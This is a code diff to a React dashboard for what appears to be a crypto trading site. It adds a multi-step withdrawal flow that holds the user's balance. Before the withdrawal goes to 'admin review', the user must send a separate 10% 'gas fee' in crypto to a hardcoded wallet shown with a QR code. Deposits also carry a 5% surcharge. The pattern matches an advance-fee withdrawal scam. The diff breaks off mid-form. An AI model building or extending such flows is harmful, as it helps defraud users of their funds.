@@ -22,6 +22,9 @@ import {
   Send,
   Plus,
   Minus,
+  ArrowLeft,
+  Zap,
+  AlertTriangle,
 } from 'lucide-react';
 import efxLogo from '../assets/EFX logo.jpg';
 import { supabase } from '../lib/supabase';
@@ -41,41 +44,52 @@ const SYMBOLS = [
 const NETWORK_OPTIONS = [
   {
     id: 'BTC',
+    asset: 'BTC',
     name: 'Bitcoin',
+    networkLabel: 'Bitcoin Native',
     sublabel: 'BTC • ~10–30 min',
     fullLabel: 'Bitcoin (BTC Network)',
     defaultWallet: 'bc1q3yh6qpja5p05jghul86myefmtgssxegp0e6424',
   },
   {
     id: 'ETH',
+    asset: 'ETH',
     name: 'Ethereum',
+    networkLabel: 'Ethereum (ERC20)',
     sublabel: 'ETH ERC20 • ~3–10 min',
     fullLabel: 'Ethereum (ETH ERC20)',
     defaultWallet: '0x442649Bec5815563722154d5EEDE79cCCA98aF67',
   },
   {
     id: 'ERC20',
+    asset: 'USDT',
     name: 'Tether',
+    networkLabel: 'USDT (ERC20 — Ethereum)',
     sublabel: 'USDT ERC20 • ~3–10 min',
     fullLabel: 'USDT (ERC20 — Ethereum)',
     defaultWallet: '0x442649Bec5815563722154d5EEDE79cCCA98aF67',
   },
   {
     id: 'TRC20',
+    asset: 'USDT',
     name: 'Tether',
+    networkLabel: 'USDT (TRC20 — Tron)',
     sublabel: 'USDT TRC20 • ~1–5 min',
     fullLabel: 'USDT (TRC20 — Tron)',
     defaultWallet: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE',
   },
   {
     id: 'BEP20',
+    asset: 'USDT',
     name: 'Tether',
+    networkLabel: 'USDT (BEP20 — BNB Smart Chain)',
     sublabel: 'USDT BEP20 • ~1–5 min',
     fullLabel: 'USDT (BEP20 — BNB Smart Chain)',
     defaultWallet: '0x442649Bec5815563722154d5EEDE79cCCA98aF67',
   },
 ];
 
+const WITHDRAW_CRYPTO_TABS = ['BTC', 'ETH', 'USDT'];
 const DEPOSIT_PRESETS = [50, 100, 500, 1000, 5000];
 const WITHDRAW_PRESETS = [100, 500, 1000, 2500, 5000];
 const DEPOSIT_GAS_RATE = 0.05;
@@ -117,12 +131,17 @@ export default function Dashboard({ session }) {
   const [depositTxHash, setDepositTxHash] = useState('');
   const [copiedWallet, setCopiedWallet] = useState(false);
 
-  // Withdraw flow
+  // 3-Step Withdraw stepper: 'form' (1) -> 'gas_summary' (2) -> 'pay_gas' (3) -> 'submitted' (4)
+  const [withdrawStep, setWithdrawStep] = useState('form');
+  const [withdrawCrypto, setWithdrawCrypto] = useState('BTC');
   const [withdrawNetworkId, setWithdrawNetworkId] = useState('BTC');
-  const [withdrawAmt, setWithdrawAmt] = useState(500);
+  const [withdrawAmt, setWithdrawAmt] = useState('');
   const [withdrawWallet, setWithdrawWallet] = useState('');
   const [withdrawPinInput, setWithdrawPinInput] = useState('');
+  const [withdrawGasTxHash, setWithdrawGasTxHash] = useState('');
   const [withdrawError, setWithdrawError] = useState('');
+  const [copiedGasWallet, setCopiedGasWallet] = useState(false);
+  const [submittingWithdraw, setSubmittingWithdraw] = useState(false);
 
   // KYC, Settings & Support
   const [docType, setDocType] = useState('International Passport');
@@ -141,11 +160,19 @@ export default function Dashboard({ session }) {
     setTimeout(() => setNotice(''), 4500);
   };
 
+  const resetWithdrawFlow = () => {
+    setWithdrawStep('form');
+    setWithdrawError('');
+    setWithdrawGasTxHash('');
+    setCopiedGasWallet(false);
+  };
+
   const selectTab = (tab) => {
     setActiveTab(tab);
     setMobileMenuOpen(false);
     setWithdrawError('');
     if (tab === 'deposit') setDepositStep('amount');
+    if (tab === 'withdraw') resetWithdrawFlow();
     if (tab === 'trade') setTicketMode('trade');
   };
 
@@ -250,6 +277,10 @@ export default function Dashboard({ session }) {
 
   const balance = Number(profile?.balance || 0);
   const kycStatus = profile?.kyc_status || 'unverified';
+  const recipientDisplayName =
+    usernameInput ||
+    profile?.full_name ||
+    (session.user.email ? session.user.email.split('@')[0] : 'Trader');
 
   const depositNetwork =
     NETWORK_OPTIONS.find((n) => n.id === depositNetworkId) || NETWORK_OPTIONS[0];
@@ -259,11 +290,28 @@ export default function Dashboard({ session }) {
   const depositGasFee = Number((parsedDepositAmt * DEPOSIT_GAS_RATE).toFixed(2));
   const totalDepositWithFee = Number((parsedDepositAmt + depositGasFee).toFixed(2));
 
+  const availableWithdrawNetworks = NETWORK_OPTIONS.filter(
+    (n) => n.asset === withdrawCrypto
+  );
   const withdrawNetwork =
-    NETWORK_OPTIONS.find((n) => n.id === withdrawNetworkId) || NETWORK_OPTIONS[0];
+    availableWithdrawNetworks.find((n) => n.id === withdrawNetworkId) ||
+    availableWithdrawNetworks[0] ||
+    NETWORK_OPTIONS[0];
+  const activeGasPaymentAddress =
+    walletsByNetwork[withdrawNetwork.id] || withdrawNetwork.defaultWallet;
   const parsedWithdrawAmt = Math.max(0, Number(withdrawAmt) || 0);
   const withdrawGasFee = Number((parsedWithdrawAmt * WITHDRAWAL_GAS_RATE).toFixed(2));
-  const netWithdrawTotal = Number((parsedWithdrawAmt + withdrawGasFee).toFixed(2));
+  const balanceAfterHold = Math.max(0, Number((balance - parsedWithdrawAmt).toFixed(2)));
+  const gasQrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=210x210&margin=8&data=${encodeURIComponent(
+    activeGasPaymentAddress
+  )}`;
+
+  const handleSelectWithdrawCrypto = (assetCode) => {
+    setWithdrawCrypto(assetCode);
+    setWithdrawError('');
+    const firstNet = NETWORK_OPTIONS.find((n) => n.asset === assetCode);
+    if (firstNet) setWithdrawNetworkId(firstNet.id);
+  };
 
   const handleCopyDepositAddress = async () => {
     try {
@@ -272,6 +320,16 @@ export default function Dashboard({ session }) {
       setTimeout(() => setCopiedWallet(false), 2000);
     } catch {
       showNotice('Copy the wallet address manually from the address box.');
+    }
+  };
+
+  const handleCopyGasAddress = async () => {
+    try {
+      await navigator.clipboard.writeText(activeGasPaymentAddress);
+      setCopiedGasWallet(true);
+      setTimeout(() => setCopiedGasWallet(false), 2000);
+    } catch {
+      showNotice('Copy the gas fee address manually.');
     }
   };
 
@@ -381,52 +439,87 @@ export default function Dashboard({ session }) {
     if (isAdmin) await loadAdminData();
   };
 
-  const handleWithdraw = async (e) => {
+  // Step 1 -> Step 2 validation
+  const handleWithdrawContinue = (e) => {
     e.preventDefault();
     setWithdrawError('');
 
     const amt = Number(withdrawAmt);
-    const gas = Number((amt * WITHDRAWAL_GAS_RATE).toFixed(2));
-    const totalDebit = Number((amt + gas).toFixed(2));
-
+    if (!amt || amt <= 0) {
+      setWithdrawError('Enter a valid withdrawal amount in USD.');
+      return;
+    }
+    if (amt > balance) {
+      setWithdrawError(
+        `Insufficient balance. Available balance is $${balance.toLocaleString(undefined, {
+          minimumFractionDigits: 2,
+        })}.`
+      );
+      return;
+    }
+    if (!withdrawWallet.trim()) {
+      setWithdrawError(`Enter your ${withdrawNetwork.asset} payout address.`);
+      return;
+    }
     if (profile?.withdrawal_pin && withdrawPinInput.trim() !== profile.withdrawal_pin) {
       setWithdrawError('Invalid 4-digit withdrawal security PIN.');
       return;
     }
-    if (!amt || amt <= 0) {
-      setWithdrawError('Enter a valid withdrawal amount.');
-      return;
-    }
-    if (!withdrawWallet.trim()) {
-      setWithdrawError(`Enter your destination ${withdrawNetwork.id} receiving wallet address.`);
-      return;
-    }
-    if (totalDebit > balance) {
-      setWithdrawError(
-        `Insufficient balance. Available: $${balance.toFixed(2)} (Required with 10% gas fee: $${totalDebit.toFixed(2)}).`
-      );
+
+    setWithdrawStep('gas_summary');
+  };
+
+  // Step 3 -> Final Submission (holds withdrawal amount from balance; 10% gas paid separately)
+  const handleFinalSubmitWithdraw = async () => {
+    setWithdrawError('');
+    const amt = Number(withdrawAmt);
+    const gas = Number((amt * WITHDRAWAL_GAS_RATE).toFixed(2));
+
+    if (!amt || amt <= 0 || amt > balance) {
+      setWithdrawError('Withdrawal amount exceeds your available balance.');
+      setWithdrawStep('form');
       return;
     }
 
-    await supabase
+    setSubmittingWithdraw(true);
+
+    const { error: balErr } = await supabase
       .from('profiles')
-      .update({ balance: balance - totalDebit })
+      .update({ balance: Number((balance - amt).toFixed(2)) })
       .eq('id', userId);
 
-    await supabase.from('transactions').insert({
+    if (balErr) {
+      setSubmittingWithdraw(false);
+      setWithdrawError(balErr.message);
+      return;
+    }
+
+    const walletSummary = withdrawGasTxHash.trim()
+      ? `${withdrawWallet.trim()} | Gas TXID: ${withdrawGasTxHash.trim()}`
+      : withdrawWallet.trim();
+
+    const { error: txErr } = await supabase.from('transactions').insert({
       user_id: userId,
-      type: `Withdrawal (${withdrawNetwork.id})`,
+      type: `Withdrawal (${withdrawNetwork.asset} • ${withdrawNetwork.networkLabel})`,
       amount: -amt,
       gas_fee: gas,
       network: withdrawNetwork.id,
-      wallet_address: withdrawWallet.trim(),
+      wallet_address: walletSummary,
       status: 'Pending',
     });
 
-    setWithdrawWallet('');
-    setWithdrawPinInput('');
+    setSubmittingWithdraw(false);
+
+    if (txErr) {
+      setWithdrawError(txErr.message);
+      return;
+    }
+
+    setWithdrawStep('submitted');
     showNotice(
-      `Withdrawal request of $${amt.toFixed(2)} (${withdrawNetwork.id}) logged with $${gas.toFixed(2)} (10%) gas fee.`
+      `Withdrawal request of $${amt.toLocaleString(undefined, {
+        minimumFractionDigits: 2,
+      })} submitted for admin review.`
     );
     await loadUserData();
     if (isAdmin) await loadAdminData();
@@ -543,7 +636,7 @@ export default function Dashboard({ session }) {
       return;
     }
 
-    showNotice('Per-network deposit wallet addresses saved.');
+    showNotice('Per-network wallet addresses saved.');
     await loadUserData();
   };
 
@@ -599,7 +692,6 @@ export default function Dashboard({ session }) {
 
     const currentBal = Number(tx.profiles?.balance || 0);
     const txAmt = Number(tx.amount);
-    const gas = Number(tx.gas_fee || 0);
 
     if (decision === 'Completed' && txAmt > 0) {
       await supabase
@@ -607,9 +699,10 @@ export default function Dashboard({ session }) {
         .update({ balance: currentBal + txAmt })
         .eq('id', tx.user_id);
     } else if (decision === 'Rejected' && txAmt < 0) {
+      // Refund the held withdrawal principal back to the user's balance
       await supabase
         .from('profiles')
-        .update({ balance: currentBal + Math.abs(txAmt) + gas })
+        .update({ balance: currentBal + Math.abs(txAmt) })
         .eq('id', tx.user_id);
     }
 
@@ -940,7 +1033,7 @@ export default function Dashboard({ session }) {
                   <strong>
                     {ticketMode === 'trade' && `Order Ticket — ${selectedSymbol.label}`}
                     {ticketMode === 'deposit' && `Quick Deposit (${depositNetwork.id} • 5% Gas)`}
-                    {ticketMode === 'withdraw' && `Quick Withdraw (${withdrawNetwork.id} • 10% Gas)`}
+                    {ticketMode === 'withdraw' && `Quick Withdraw (${withdrawNetwork.asset} • 10% Separate Gas)`}
                   </strong>
 
                   <div className="mode-switcher-bar">
@@ -1042,53 +1135,19 @@ export default function Dashboard({ session }) {
                 )}
 
                 {ticketMode === 'withdraw' && (
-                  <div>
-                    <form onSubmit={handleWithdraw} className="dock-inline-row">
-                      <div className="dock-field">
-                        <label className="form-label">Withdraw Amount (USD)</label>
-                        <input
-                          type="number"
-                          className="form-control tabular"
-                          min="10"
-                          value={withdrawAmt}
-                          onChange={(e) => setWithdrawAmt(e.target.value)}
-                          required
-                        />
+                  <div className="dock-inline-row" style={{ justifyContent: 'space-between' }}>
+                    <div>
+                      <div style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>
+                        Select crypto &amp; network, review the separate 10% network gas fee, and complete gas payment to submit.
                       </div>
-                      <div className="dock-field">
-                        <label className="form-label">{withdrawNetwork.id} Receiving Wallet</label>
-                        <input
-                          type="text"
-                          className="form-control"
-                          placeholder="Paste your receiving wallet"
-                          value={withdrawWallet}
-                          onChange={(e) => setWithdrawWallet(e.target.value)}
-                          required
-                        />
-                      </div>
-                      <div className="dock-field" style={{ maxWidth: '130px' }}>
-                        <label className="form-label">4-Digit PIN</label>
-                        <input
-                          type="password"
-                          inputMode="numeric"
-                          maxLength={4}
-                          className="form-control tabular"
-                          placeholder="••••"
-                          value={withdrawPinInput}
-                          onChange={(e) =>
-                            setWithdrawPinInput(e.target.value.replace(/\D/g, '').slice(0, 4))
-                          }
-                        />
-                      </div>
-                      <button type="submit" className="btn btn-white">
-                        Withdraw (${netWithdrawTotal.toFixed(2)})
-                      </button>
-                    </form>
-                    {withdrawError && (
-                      <div className="auth-alert error" style={{ marginTop: '12px', marginBottom: 0 }}>
-                        {withdrawError}
-                      </div>
-                    )}
+                    </div>
+                    <button
+                      type="button"
+                      className="btn btn-crimson"
+                      onClick={() => selectTab('withdraw')}
+                    >
+                      Open Withdraw Flow →
+                    </button>
                   </div>
                 )}
               </div>
@@ -1438,20 +1497,92 @@ export default function Dashboard({ session }) {
           )}
 
           {activeTab === 'withdraw' && (
-            <div style={{ maxWidth: '820px' }}>
+            <div style={{ maxWidth: '640px' }}>
               <div className="panel-card">
-                <div className="panel-header">
-                  <div>
-                    <h3>Withdraw Funds</h3>
-                    <div style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
-                      Withdraw to any external wallet • 10% automatic gas fee applies
+                {/* Top Header matching step progress */}
+                <div
+                  style={{
+                    display: 'flex',
+                    justifyContent: 'space-between',
+                    alignItems: 'center',
+                    marginBottom: '18px',
+                    paddingBottom: '12px',
+                    borderBottom: '1px solid var(--border-subtle)',
+                  }}
+                >
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                    {withdrawStep === 'gas_summary' && (
+                      <button
+                        type="button"
+                        onClick={() => setWithdrawStep('form')}
+                        style={{
+                          background: 'transparent',
+                          border: 'none',
+                          color: 'var(--text-primary)',
+                          cursor: 'pointer',
+                          display: 'inline-flex',
+                          alignItems: 'center',
+                          padding: 0,
+                        }}
+                        aria-label="Back to withdrawal details"
+                      >
+                        <ArrowLeft size={18} />
+                      </button>
+                    )}
+                    {withdrawStep === 'pay_gas' && (
+                      <button
+                        type="button"
+                        onClick={() => setWithdrawStep('gas_summary')}
+                        style={{
+                          background: 'transparent',
+                          border: 'none',
+                          color: 'var(--text-primary)',
+                          cursor: 'pointer',
+                          display: 'inline-flex',
+                          alignItems: 'center',
+                          padding: 0,
+                        }}
+                        aria-label="Back to gas fee breakdown"
+                      >
+                        <ArrowLeft size={18} />
+                      </button>
+                    )}
+                    <div>
+                      <h3 style={{ margin: 0 }}>
+                        {withdrawStep === 'form' && 'Withdraw Funds'}
+                        {withdrawStep === 'gas_summary' && 'Gas Fee'}
+                        {withdrawStep === 'pay_gas' && 'Pay Gas & Submit'}
+                        {withdrawStep === 'submitted' && 'Withdrawal Submitted'}
+                      </h3>
+                      <div className="tabular" style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
+                        Available Balance: ${balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
+                      </div>
                     </div>
                   </div>
-                  <div className="tabular" style={{ textAlign: 'right' }}>
-                    <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
-                      AVAILABLE BALANCE
-                    </div>
-                    <strong>${balance.toFixed(2)}</strong>
+
+                  {/* Step Indicator Dots */}
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
+                    {['form', 'gas_summary', 'pay_gas'].map((s, idx) => {
+                      const stepOrder = { form: 0, gas_summary: 1, pay_gas: 2, submitted: 3 };
+                      const currentIdx = stepOrder[withdrawStep] ?? 0;
+                      const isCurrent = currentIdx === idx;
+                      const isDone = currentIdx > idx;
+                      return (
+                        <span
+                          key={s}
+                          style={{
+                            width: isCurrent ? '22px' : '8px',
+                            height: '8px',
+                            borderRadius: '999px',
+                            background:
+                              isCurrent || isDone
+                                ? 'var(--accent-crimson)'
+                                : 'rgba(255,255,255,0.2)',
+                            transition: 'all 0.2s ease',
+                          }}
+                        />
+                      );
+                    })}
                   </div>
                 </div>
 
@@ -1461,122 +1592,500 @@ export default function Dashboard({ session }) {
                   </div>
                 )}
 
-                <form onSubmit={handleWithdraw}>
-                  <div className="form-group">
-                    <label className="form-label">1 • Choose Payout Method</label>
-                    <div style={{ fontSize: '12px', color: 'var(--text-secondary)', marginBottom: '8px' }}>
-                      Select the network you&apos;ll receive funds on. Double-check the address — crypto sends are irreversible.
+                {/* STEP 1: Crypto, Network, Amount, Payout Address */}
+                {withdrawStep === 'form' && (
+                  <form onSubmit={handleWithdrawContinue}>
+                    <div className="form-group">
+                      <label
+                        className="form-label"
+                        style={{ letterSpacing: '0.06em', fontSize: '11px' }}
+                      >
+                        CRYPTOCURRENCY
+                      </label>
+                      <div
+                        style={{
+                          display: 'grid',
+                          gridTemplateColumns: 'repeat(3, 1fr)',
+                          gap: '10px',
+                        }}
+                      >
+                        {WITHDRAW_CRYPTO_TABS.map((asset) => {
+                          const active = withdrawCrypto === asset;
+                          return (
+                            <button
+                              key={asset}
+                              type="button"
+                              onClick={() => handleSelectWithdrawCrypto(asset)}
+                              style={{
+                                padding: '12px 10px',
+                                borderRadius: '8px',
+                                fontWeight: 700,
+                                fontSize: '13.5px',
+                                cursor: 'pointer',
+                                border: active
+                                  ? '1px solid var(--accent-crimson)'
+                                  : '1px solid var(--border-subtle)',
+                                background: active
+                                  ? 'var(--accent-crimson)'
+                                  : 'rgba(255,255,255,0.03)',
+                                color: '#FFFFFF',
+                                transition: 'all 0.15s ease',
+                              }}
+                            >
+                              {asset}
+                            </button>
+                          );
+                        })}
+                      </div>
                     </div>
-                    <div className="asset-choice-grid">
-                      {NETWORK_OPTIONS.map((net) => {
-                        const active = net.id === withdrawNetwork.id;
-                        return (
-                          <button
-                            key={net.id}
-                            type="button"
-                            onClick={() => {
-                              setWithdrawNetworkId(net.id);
-                              setWithdrawError('');
-                            }}
-                            className={`asset-choice-card ${active ? 'active' : ''}`}
-                          >
-                            <CurrencyIcon code={net.id} size={24} />
-                            <div>
-                              <strong>{net.name}</strong>
-                              <div style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
-                                {net.sublabel}
-                              </div>
-                            </div>
-                          </button>
-                        );
-                      })}
-                    </div>
-                  </div>
 
-                  <div className="form-group">
-                    <label className="form-label">2 • Amount &amp; Wallet</label>
-                    <input
-                      type="number"
-                      className="form-control tabular"
-                      min="10"
-                      step="0.01"
-                      value={withdrawAmt}
-                      onChange={(e) => setWithdrawAmt(e.target.value)}
-                      required
-                    />
-                    <div className="preset-chip-row tabular">
-                      {WITHDRAW_PRESETS.map((preset) => (
-                        <button
-                          key={preset}
-                          type="button"
-                          className={`preset-chip ${Number(withdrawAmt) === preset ? 'active' : ''}`}
-                          onClick={() => setWithdrawAmt(preset)}
+                    <div className="form-group">
+                      <label
+                        className="form-label"
+                        style={{ letterSpacing: '0.06em', fontSize: '11px' }}
+                      >
+                        NETWORK
+                      </label>
+                      <select
+                        className="form-control"
+                        value={withdrawNetwork.id}
+                        onChange={(e) => {
+                          setWithdrawNetworkId(e.target.value);
+                          setWithdrawError('');
+                        }}
+                      >
+                        {availableWithdrawNetworks.map((net) => (
+                          <option key={net.id} value={net.id}>
+                            {net.networkLabel}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
+
+                    <div className="form-group">
+                      <label
+                        className="form-label"
+                        style={{ letterSpacing: '0.06em', fontSize: '11px' }}
+                      >
+                        AMOUNT (USD)
+                      </label>
+                      <div style={{ position: 'relative' }}>
+                        <span
+                          className="tabular"
+                          style={{
+                            position: 'absolute',
+                            left: '14px',
+                            top: '50%',
+                            transform: 'translateY(-50%)',
+                            color: 'var(--text-secondary)',
+                            fontWeight: 700,
+                          }}
                         >
-                          ${preset.toLocaleString()}
-                        </button>
-                      ))}
-                    </div>
-                  </div>
+                          $
+                        </span>
+                        <input
+                          type="number"
+                          className="form-control tabular"
+                          style={{ paddingLeft: '28px' }}
+                          min="1"
+                          step="0.01"
+                          placeholder="0.00"
+                          value={withdrawAmt}
+                          onChange={(e) => setWithdrawAmt(e.target.value)}
+                          required
+                        />
+                      </div>
 
-                  <div className="form-group">
-                    <label className="form-label">Your Receiving Wallet Address</label>
-                    <input
-                      type="text"
-                      className="form-control"
-                      placeholder="Paste your receiving address"
-                      value={withdrawWallet}
-                      onChange={(e) => setWithdrawWallet(e.target.value)}
-                      required
-                    />
-                    <div style={{ fontSize: '11.5px', color: '#FBBF24', marginTop: '6px' }}>
-                      Verify the address carefully — crypto transfers cannot be reversed.
-                    </div>
-                  </div>
+                      <div className="preset-chip-row tabular">
+                        {WITHDRAW_PRESETS.map((preset) => (
+                          <button
+                            key={preset}
+                            type="button"
+                            className={`preset-chip ${Number(withdrawAmt) === preset ? 'active' : ''}`}
+                            onClick={() => setWithdrawAmt(String(preset))}
+                          >
+                            ${preset.toLocaleString()}
+                          </button>
+                        ))}
+                      </div>
 
-                  <div className="form-group">
-                    <label className="form-label">4-Digit Withdrawal Security PIN</label>
-                    <input
-                      type="password"
-                      inputMode="numeric"
-                      maxLength={4}
-                      className="form-control tabular"
-                      placeholder="••••"
-                      value={withdrawPinInput}
-                      onChange={(e) =>
-                        setWithdrawPinInput(e.target.value.replace(/\D/g, '').slice(0, 4))
-                      }
-                    />
-                  </div>
+                      <div
+                        className="tabular"
+                        style={{
+                          fontSize: '12px',
+                          color: 'var(--text-secondary)',
+                          marginTop: '8px',
+                        }}
+                      >
+                        Gas fee (paid separately):{' '}
+                        <strong style={{ color: '#FBBF24' }}>
+                          ${withdrawGasFee.toLocaleString(undefined, { minimumFractionDigits: 0, maximumFractionDigits: 2 })}
+                        </strong>
+                      </div>
+                    </div>
 
-                  <div className="summary-card tabular" style={{ marginBottom: '16px' }}>
-                    <div className="summary-row">
-                      <span>Method</span>
-                      <strong>{withdrawNetwork.id}</strong>
+                    <div className="form-group">
+                      <label
+                        className="form-label"
+                        style={{ letterSpacing: '0.06em', fontSize: '11px' }}
+                      >
+                        YOUR {withdrawNetwork.asset} PAYOUT ADDRESS
+                      </label>
+                      <input
+                        type="text"
+                        className="form-control"
+                        placeholder={`Address to receive ${withdrawNetwork.asset}`}
+                        value={withdrawWallet}
+                        onChange={(e) => setWithdrawWallet(e.target.value)}
+                        required
+                      />
                     </div>
-                    <div className="summary-row">
-                      <span>Amount</span>
-                      <strong>${parsedWithdrawAmt.toFixed(2)}</strong>
+
+                    {profile?.withdrawal_pin && (
+                      <div className="form-group">
+                        <label
+                          className="form-label"
+                          style={{ letterSpacing: '0.06em', fontSize: '11px' }}
+                        >
+                          4-DIGIT WITHDRAWAL SECURITY PIN
+                        </label>
+                        <input
+                          type="password"
+                          inputMode="numeric"
+                          maxLength={4}
+                          className="form-control tabular"
+                          placeholder="••••"
+                          value={withdrawPinInput}
+                          onChange={(e) =>
+                            setWithdrawPinInput(e.target.value.replace(/\D/g, '').slice(0, 4))
+                          }
+                          required
+                        />
+                      </div>
+                    )}
+
+                    <div
+                      style={{
+                        display: 'grid',
+                        gridTemplateColumns: '1fr 1.3fr',
+                        gap: '12px',
+                        marginTop: '18px',
+                      }}
+                    >
+                      <button
+                        type="button"
+                        className="btn btn-outline"
+                        onClick={() => selectTab('overview')}
+                      >
+                        CANCEL
+                      </button>
+                      <button type="submit" className="btn btn-crimson">
+                        CONTINUE →
+                      </button>
                     </div>
-                    <div className="summary-row">
-                      <span>Gas Fee (10%)</span>
-                      <strong style={{ color: '#fda4af' }}>+${withdrawGasFee.toFixed(2)}</strong>
+                  </form>
+                )}
+
+                {/* STEP 2: Gas Fee — Paid Separately */}
+                {withdrawStep === 'gas_summary' && (
+                  <div>
+                    <div
+                      style={{
+                        background: 'rgba(153, 27, 27, 0.14)',
+                        border: '1px solid rgba(220, 38, 38, 0.45)',
+                        borderRadius: '10px',
+                        padding: '14px 16px',
+                        marginBottom: '18px',
+                      }}
+                    >
+                      <div
+                        style={{
+                          display: 'flex',
+                          alignItems: 'center',
+                          gap: '8px',
+                          fontWeight: 700,
+                          fontSize: '13.5px',
+                          color: '#FCA5A5',
+                          marginBottom: '6px',
+                        }}
+                      >
+                        <AlertTriangle size={16} />
+                        <span>Gas fee — paid separately</span>
+                      </div>
+                      <p
+                        style={{
+                          fontSize: '12.5px',
+                          color: 'var(--text-secondary)',
+                          margin: 0,
+                          lineHeight: 1.5,
+                        }}
+                      >
+                        A network gas fee is required to process your withdrawal. This is{' '}
+                        <strong style={{ color: '#FFFFFF' }}>not</strong> deducted from your wallet balance. You will pay it in crypto on the next step.
+                      </p>
                     </div>
-                    <div className="summary-row">
-                      <span>Balance Deducted</span>
-                      <strong>${netWithdrawTotal.toFixed(2)}</strong>
+
+                    <div className="summary-card tabular" style={{ marginBottom: '14px' }}>
+                      <div className="summary-row" style={{ padding: '10px 0' }}>
+                        <span style={{ color: 'var(--text-secondary)' }}>Withdrawal amount</span>
+                        <strong style={{ fontSize: '16px' }}>
+                          ${parsedWithdrawAmt.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                        </strong>
+                      </div>
+                      <div className="summary-row" style={{ padding: '10px 0' }}>
+                        <span style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', color: 'var(--text-secondary)' }}>
+                          <Zap size={14} color="#FBBF24" /> Gas fee to pay
+                        </span>
+                        <strong style={{ fontSize: '16px', color: '#FBBF24' }}>
+                          ${withdrawGasFee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                        </strong>
+                      </div>
+                      <div
+                        className="summary-row"
+                        style={{
+                          padding: '12px 0 6px',
+                          borderTop: '1px solid var(--border-subtle)',
+                          marginTop: '6px',
+                        }}
+                      >
+                        <strong style={{ letterSpacing: '0.04em', fontSize: '12.5px' }}>
+                          HELD FROM BALANCE
+                        </strong>
+                        <strong style={{ fontSize: '18px', color: '#FCA5A5' }}>
+                          ${parsedWithdrawAmt.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                        </strong>
+                      </div>
                     </div>
-                    <div className="summary-row">
-                      <span>You Receive</span>
-                      <strong style={{ color: 'var(--positive)' }}>
-                        ${parsedWithdrawAmt.toFixed(2)}
+
+                    <div
+                      className="tabular"
+                      style={{
+                        textAlign: 'center',
+                        fontSize: '12.5px',
+                        color: 'var(--text-secondary)',
+                        marginBottom: '18px',
+                      }}
+                    >
+                      Balance after hold:{' '}
+                      <strong style={{ color: '#FFFFFF' }}>
+                        ${balanceAfterHold.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                       </strong>
                     </div>
-                  </div>
 
-                  <button type="submit" className="btn btn-crimson" style={{ width: '100%' }}>
-                    Continue
-                  </button>
-                </form>
+                    <div
+                      style={{
+                        display: 'grid',
+                        gridTemplateColumns: '1fr 1.3fr',
+                        gap: '12px',
+                      }}
+                    >
+                      <button
+                        type="button"
+                        className="btn btn-outline"
+                        onClick={() => setWithdrawStep('form')}
+                      >
+                        GO BACK
+                      </button>
+                      <button
+                        type="button"
+                        className="btn btn-crimson"
+                        onClick={() => setWithdrawStep('pay_gas')}
+                      >
+                        PROCEED →
+                      </button>
+                    </div>
+                  </div>
+                )}
+
+                {/* STEP 3: Pay Gas & Submit (QR Code + Custody Wallet + Done) */}
+                {withdrawStep === 'pay_gas' && (
+                  <div>
+                    <div
+                      style={{
+                        border: '1px solid rgba(220, 38, 38, 0.45)',
+                        background: 'rgba(255,255,255,0.02)',
+                        borderRadius: '12px',
+                        padding: '18px 16px',
+                        textAlign: 'center',
+                        marginBottom: '16px',
+                      }}
+                    >
+                      <div
+                        style={{
+                          display: 'inline-flex',
+                          alignItems: 'center',
+                          gap: '6px',
+                          fontSize: '11.5px',
+                          fontWeight: 700,
+                          letterSpacing: '0.06em',
+                          color: '#FBBF24',
+                          marginBottom: '14px',
+                        }}
+                      >
+                        <Zap size={14} /> PAY GAS FEE TO THIS ADDRESS
+                      </div>
+
+                      <div
+                        style={{
+                          background: '#FFFFFF',
+                          padding: '10px',
+                          borderRadius: '10px',
+                          width: '190px',
+                          height: '190px',
+                          margin: '0 auto 14px',
+                          display: 'flex',
+                          alignItems: 'center',
+                          justifyContent: 'center',
+                        }}
+                      >
+                        <img
+                          src={gasQrUrl}
+                          alt={`${withdrawNetwork.asset} Gas Fee QR`}
+                          style={{ width: '170px', height: '170px', display: 'block' }}
+                        />
+                      </div>
+
+                      <div
+                        style={{
+                          fontSize: '12px',
+                          color: 'var(--text-secondary)',
+                          marginBottom: '6px',
+                        }}
+                      >
+                        {withdrawNetwork.name} · {withdrawNetwork.asset}
+                      </div>
+
+                      <div
+                        className="tabular"
+                        style={{
+                          fontFamily: 'monospace',
+                          fontSize: '12.5px',
+                          wordBreak: 'break-all',
+                          background: 'rgba(0,0,0,0.45)',
+                          border: '1px solid var(--border-subtle)',
+                          borderRadius: '8px',
+                          padding: '10px 12px',
+                          marginBottom: '10px',
+                        }}
+                      >
+                        {activeGasPaymentAddress}
+                      </div>
+
+                      <button
+                        type="button"
+                        className="btn btn-outline btn-sm"
+                        onClick={handleCopyGasAddress}
+                      >
+                        {copiedGasWallet ? <Check size={14} /> : <Copy size={14} />}
+                        {copiedGasWallet ? 'Copied address' : 'Copy address'}
+                      </button>
+
+                      <div
+                        className="tabular"
+                        style={{
+                          fontSize: '12px',
+                          color: 'var(--text-secondary)',
+                          marginTop: '12px',
+                        }}
+                      >
+                        Send exactly{' '}
+                        <strong style={{ color: '#FBBF24' }}>
+                          ${withdrawGasFee.toLocaleString(undefined, { minimumFractionDigits: 0, maximumFractionDigits: 2 })}
+                        </strong>{' '}
+                        equivalent in <strong style={{ color: '#FFFFFF' }}>{withdrawNetwork.asset}</strong> before submitting.
+                      </div>
+                    </div>
+
+                    <div className="form-group">
+                      <label className="form-label">Gas Payment TXID / Hash (Optional)</label>
+                      <input
+                        type="text"
+                        className="form-control"
+                        placeholder="Paste gas payment transaction hash..."
